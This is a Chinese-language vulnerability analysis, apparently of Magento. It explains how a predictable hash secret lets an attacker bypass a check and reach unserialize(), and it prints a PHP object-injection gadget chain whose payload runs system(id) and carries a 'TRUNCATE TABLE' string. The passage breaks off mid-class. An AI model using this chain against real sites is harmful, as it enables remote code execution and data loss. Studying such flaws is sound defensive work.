文章中可以分为两个部分，第一部分是绕过hash验证、第二个部分利用unserialize。

1. 绕过hash验证

这 个绕过的关键是利用了算法的脆弱。if ($newHash == $gaHash) { 中的$gaHash是我们可控的参数，$newHash为程序生成的参数，程序的生产算法让我们可预测造成了绕过，return md5($data . $secret); $data参数我们已知，$secret为程序安装时间，这个时间可预测所以造成了算法的脆弱，让一些关键代码被执行。这样的关键 key被可预测的漏洞，在很多程序中出现过，比如：pageadmin的validate可预测等等。

一个漏洞的形成，有两个必不可少的因素：一个是可控数据、一个是可利用方法。这两个因素结合产生和程序预期不一样的结果，我们可以说他是一个漏洞，产生的危害越大我们说漏洞越严重。

在 这个程序中ga参数是我们可控数据，unserialize()是我们可利用方法，我们怎么来让这个漏洞危害变大，达到执行任意代码的程度。首先我们理解 一下unserialize()反序列漏洞的利用必须条件，unserialize()对object类型的数据进行反序列处理的时候一些特定的魔术方法 会被调用，比如：__wakeup()、__destruct()，然后我们控制这些方法下面的功能代码执行我们想要的操作。

class Zend_Db_Profiler {
protected $_enabled = false;
}
class Varien_Filter_Template_Simple {
protected $_startTag;
protected $_endTag;
public function __construct() {
$this->_startTag = 'TRUNCATE TABLE ';
$this->_endTag = 'RIPS';
}
}
class Varien_Db_Adapter_Pdo_Mysql {
protected $_transactionLevel = 0;
protected $_queryHook;
protected $_profiler;
public function __construct() {
$this->_queryHook = array();
$this->_queryHook['object'] = new Varien_Filter_Template_Simple;
$this->_queryHook['method'] = 'filter';
$this->_profiler = new Zend_Db_Profiler;
}
}
class Varien_Cache_Backend_Database {
protected $_options;
protected $_adapter;
public function __construct() {
$this->_adapter = new Varien_Db_Adapter_Pdo_Mysql;
$this->_options['data_table'] = '{${system(id)}}RIPS';
$this->_options['store_data'] = true;
}
}
class Varien_File_Uploader_Image {
public $uploader;
public function __construct() {
$this->uploader = new Varien_Cache_Backend_Database;
}
